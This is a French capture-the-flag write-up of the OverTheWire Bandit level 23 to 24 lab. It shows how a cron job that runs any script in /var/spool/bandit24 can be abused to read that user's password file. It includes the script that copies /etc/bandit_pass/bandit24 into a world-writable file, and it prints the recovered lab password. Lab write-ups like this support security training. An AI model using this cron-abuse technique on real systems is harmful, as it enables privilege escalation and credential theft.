## Over-The-Wire -writeup-
### Bandit23 (bandit23@bandit.labs.overthewire.org)

---
#### Etape 1

Une tache est encore automatisée par **conf**, dans `/etc/cron.d/`. Suprise, le fichier cron s'appelle: **cronjob_bandit24**. Regardons son contenu:

```console
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24 
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

Il exécute chaque minute le script `/usr/bin/cronjob_bandit24.sh`. Alors examinons le aussi !

```console
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh 
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 ./$i
	rm -f ./$i
    fi
done
```

Le script va dans le répertoire `/var/spool/bandit24` car la variable `myname` prend la valeur `bandit24`.  
*Car la tâche **cron** est éxécutée par *bandit24*, voir plus haut !*

Ensuite, comme le dit la ligne *echo*, le script exécute chaque scripts dans le dossier en question, puis les supprimes.

---
#### Etape 2

Il va falloit créer un script dans `/var/spool/bandit24`, qui du coup sera exécuté avec les privilèges de **bandit24**, nous permettant de récupérer son mot de passe.  
On se place dans un dossier temporaire, et on **crée notre script** ainsi qu'un fichier vide qui recevra le mot de passe:
`touch script.sh`
`touch outputPass`

---
#### Etape 3

Création du script:

```console
bandit23@bandit:/tmp/visages$ printf '#!/bin/bash\n\ncat /etc/bandit_pass/bandit24 >> /tmp/visages/output' > script.sh
```

*NB: La fin de la commande `> script.sh` insère la commande de *echo* dans le fichier `script.sh`
Voila à quoi le script ressemble *(puisque tout est sur une ligne, et qu'on a rajouté des **\n** qui saute des lignes)*:
```
#!/bin/bash

cat /etc/bandit_pass/bandit24 >> /tmp/visages/output
```

La tâche automatique va exécuter tout les scripts sous `var/spool/bandit24` en tant que **bandit24**.  
Notre script demandera alors d'afficher le mot de passe de **bandit24**, et de le rediriger dans notre fichier /tmp/visages/**output** !

---
#### Etape 4

Maintenant il faut **rendre notre script, et notre fichier output exécutables !**. Sinon **bandit24** ne pourra pas exécuter / écrire dans nos fihchiers.  
Pour cela, on utilise `chmod`:

```console
bandit23@bandit:/tmp/visages$ chmod 777 script.sh 
bandit23@bandit:/tmp/visages$ chmod 666 output
```

---
#### Etape 5

Copier notre script dans `/var/spool/bandit24/` pour qu'il soit exécuté.
> bandit23@bandit:/tmp/visages$ cp script.sh /var/spool/bandit24/

On attend moins d'une minute, et tada !

```console
bandit23@bandit:/tmp/visages$ cat output 
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

---
Mot de passe: **UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ**
